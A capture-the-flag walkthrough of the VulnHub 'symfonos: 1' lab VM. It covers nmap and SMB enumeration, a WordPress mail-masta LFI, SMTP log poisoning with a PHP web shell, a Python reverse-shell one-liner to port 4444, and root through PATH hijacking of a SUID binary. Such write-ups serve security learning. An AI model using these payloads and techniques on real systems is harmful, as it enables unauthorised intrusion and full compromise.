<h1>symfonos: 1</h1>

**Today, we'll be looking at the symfonos 1 machine on vulnhub.**

**You can download the machine here:**
<https://www.vulnhub.com/entry/symfonos-1,322/>

Let's scan the machine with nmap.
```
┌──(root㉿kali)-[~]
└─# nmap -sS -A 172.16.243.134 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 09:13 EET
Nmap scan report for 172.16.243.134
Host is up (0.00012s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab5b45a70547a50445ca6f18bd1803c2 (RSA)
|   256 a05f400a0a1f68353ef45407619fc64a (ECDSA)
|_  256 bc31f540bc08584bfb6617ff8412ac1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:4D:BC:CD (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-06-19T07:13:23
|_  start_date: N/A
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2023-06-19T02:13:23-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE
HOP RTT     ADDRESS
1   0.12 ms 172.16.243.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.81 seconds
```

We can see that the machine is running smb.

Let's use enum4linux to enumerate the mahcine.

```enum4linux -a 172.16.243.134```

We found a username.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic1.png)

We also found shares on the machine.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic2.png)

Let's check the anonymous share as it doesn't have a password.

```smbclient //symfonos.local//anonymous```

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic3.png)

We found an interesting file **attention.txt**.

Let's get that.

Looks like we got some passwords.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic4.png)

Let's try to login into the helios share with those.

We got in with the password **qwerty**.

We also found two files.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic5.png)

We found a directory in the **todo.txt** file.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic6.png)

Looks like it's runnin wordpress.

Let's run wpscan.

```wpscan --url http://symfonos.local/h3l105```

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic7.png)

We found a plugin called **mail-masta** that has an LFI vulnerability.

You can find it [here](https://www.exploit-db.com/exploits/40290).

We can read the /etc/passwd file.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic8.png)

Now, let's try to include php shell code.

We can use the smtp server running on port 25 to send the php code.

```MAIL FROM: <hacker>```

```RCPT TO: Helios```

```data```

```<?php system($_GET[‘cmd’]); ?>```

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic9.png)

We can verify it's working by runnin the command **id**.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic10.png)

Now, let's open a shell on the machine.

I'll use this python shell.

```python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.243.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'```

We got a shell.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic11.png)


After some local enumeration, I found an interesting file in the **opt** directory called **statuscheck**.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic12.png)

I ran it and looks like it ran the curl command.

And it is run as root.

We can modify the PATH variable and use that to gain root priviliges.

First let's go to the **tmp** directory and create our own curl command.

After that, we need to modify the PATH variable to run the curl command we just created.

``echo "/bin/sh" > curl``

``chmod 777 curl``

``export PATH=.:$PATH``

Now, if we run ``/opt/statuscheck``, we should become root.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/symfonos1/pics/pic13.png)
